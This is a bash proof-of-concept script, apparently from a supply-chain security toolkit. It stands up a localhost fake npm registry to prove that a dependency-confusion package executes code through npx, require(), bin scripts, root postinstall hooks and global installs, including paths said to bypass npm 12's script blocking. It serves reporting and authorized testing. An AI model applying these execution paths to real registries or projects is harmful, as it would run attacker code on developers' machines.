#!/usr/bin/env bash
# demo_npm_rce.sh — prove RCE for an npm dependency-confusion finding on
# the client the victim actually uses, using only localhost resources.
#
# Usage:
#   scripts/demo_npm_rce.sh <package-name> [tag]
#     tag = runner | dep | tool | ownscript | global  (default: runner)
#
# What it demonstrates, per tag (npm 12 blocks dependency install scripts
# by default; everything below still executes there — verified 12.2.0):
#   runner: `npx <name>` fetch-and-run -> payload executes immediately
#   dep:    victim project installs <name>, then require()s it, as any
#           app using its own dependency would -> module body executes
#   tool:   victim's package.json scripts invoke the delivered bin (npm
#           12 still links bins; .bin is on the npm run PATH)
#   ownscript: victim's own lifecycle script (postinstall) invokes the
#           delivered bin during a FULL `npm install` — root scripts are
#           NOT gated by npm 12, so this is RCE DURING INSTALL on 12+
#   global: `npm install -g <name>` (scripts blocked, bin linked) then
#           invoking the global bin — the docs-follower flow
#
# By default the GENERATED marker payload is served. To demo the real
# poc_packages payloads:
#   TARBALL=path/to/supplyshark-poc-rce-1.3.37.tgz scripts/demo_npm_rce.sh <name> runner
# (build it: cd poc_packages/npm/rce && npm pack)
#
# Educational / authorized-testing use only. Localhost + temp dirs; no
# real registry is contacted; nothing is published.
set -uo pipefail

NAME="${1:?usage: demo_npm_rce.sh <package-name> [runner|dep|tool]}"
TAG="${2:-runner}"
HERE="$(cd "$(dirname "$0")" && pwd)"
PORT="${PORT:-8135}"
WORK="$(mktemp -d /tmp/npm-rce-demo.XXXXXX)"
MARKER="$WORK/marker.txt"
SRV_PID=""

cleanup() { [ -n "${SRV_PID:-}" ] && kill "$SRV_PID" 2>/dev/null; }
trap cleanup EXIT

TARBALL_ARGS=()
if [ -n "${TARBALL:-}" ]; then
    TARBALL_ARGS=(--tarball "$NAME:=$TARBALL")
fi

# ${arr[@]+...} guard: macOS bash 3.2 + set -u aborts on empty-array expansion
python3 "$HERE/fake_registry.py" --port "$PORT" --marker-file "$MARKER" \
    ${TARBALL_ARGS[@]+"${TARBALL_ARGS[@]}"} > "$WORK/server.log" 2>&1 &
SRV_PID=$!
sleep 1.5
REG="http://127.0.0.1:$PORT"
CLIENT="${CLIENT:-npm}"
CLIENT_BIN="$(command -v "$CLIENT" 2>/dev/null || echo "$CLIENT")"
VER="$("$CLIENT_BIN" --version 2>/dev/null || echo '?')"

victim() { mkdir -p "$WORK/$1" && cd "$WORK/$1"; printf '{"name":"victim","private":true}\n' > package.json; echo "registry=$REG/" > .npmrc; }

echo "== demo: [$TAG] $NAME  (client: $CLIENT $VER) =="

case "$TAG" in
  runner)
    victim runner
    if POC_NAME="$NAME" POC_MARKER="$MARKER" npx --yes --registry="$REG" "$NAME" 2>&1 | grep -viE 'npm (warn|notice)' | head -2; then :; fi
    ;;
  dep)
    victim dep
    POC_NAME="$NAME" POC_MARKER="$MARKER" "$CLIENT_BIN" install "$NAME" --no-audit --no-fund 2>&1 | grep -viE 'npm (warn|notice)|^\s*$' | head -2
    echo "-- victim app imports its dependency:"
    POC_NAME="$NAME" POC_MARKER="$MARKER" node -e "require('$NAME')"
    ;;
  tool)
    victim tool
    printf '{"name":"victim","private":true,"scripts":{"build":"%s"}}\n' "$NAME" > package.json
    POC_NAME="$NAME" POC_MARKER="$MARKER" "$CLIENT_BIN" install "$NAME" --no-audit --no-fund 2>&1 | grep -viE 'npm (warn|notice)|^\s*$' | head -2
    echo "-- victim runs its own build script, which invokes the delivered bin:"
    POC_NAME="$NAME" POC_MARKER="$MARKER" "$CLIENT_BIN" run build --silent 2>&1 | head -1
    ;;
  ownscript)
    # npm 12 install-time RCE: root lifecycle scripts are NOT gated; the
    # victim's postinstall invoking the delivered bin executes mid-install.
    # (Root lifecycles run on FULL installs — hence the pre-declared dep.)
    victim ownscript
    printf '{"name":"victim","private":true,\n "dependencies":{"%s":"^1.0.0"},\n "scripts":{"postinstall":"%s --init"}}\n' "$NAME" "$NAME" > package.json
    POC_NAME="$NAME" POC_MARKER="$MARKER" "$CLIENT_BIN" install --no-audit --no-fund 2>&1 | grep -viE 'npm (warn|notice)|^\s*$' | head -2
    ;;
  global)
    GHOME="$WORK/global-prefix"; mkdir -p "$GHOME"
    rm -f "$MARKER"
    POC_NAME="$NAME" POC_MARKER="$MARKER" "$CLIENT_BIN" install -g "$NAME" \
        --prefix "$GHOME" --registry="$REG" --no-audit --no-fund 2>&1 | grep -viE 'npm (warn|notice)|^\s*$' | head -2
    echo "-- docs-follower invokes the global bin (the very next command):"
    POC_NAME="$NAME" POC_MARKER="$MARKER" PATH="$GHOME/bin:$PATH" "$NAME" 2>&1 | head -1
    ;;
  *) echo "unknown tag: $TAG (use runner|dep|tool|ownscript|global)"; exit 2;;
esac

echo
if [ -s "$MARKER" ]; then
    echo "== RCE PROVEN ($TAG, $CLIENT $VER) =="
    echo "-- marker: $(head -1 "$MARKER")"
    echo "-- server saw the resolution: $(grep -m1 "RESOLVED: $NAME" "$WORK/server.log" || echo '(see server.log)')"
    echo "Evidence: marker line above + the RESOLVED log line. Keep $WORK if"
    echo "you need the artifacts (it is outside the cleanup trap on success)."
    trap - EXIT
else
    echo "== NO EXECUTION on $CLIENT $VER via [$TAG] =="
    echo "Check $WORK/server.log for a RESOLVED line: if present, the package"
    echo "was delivered but this path is blocked on this client — try another"
    echo "tag, or record the client version in the report's impact section."
fi
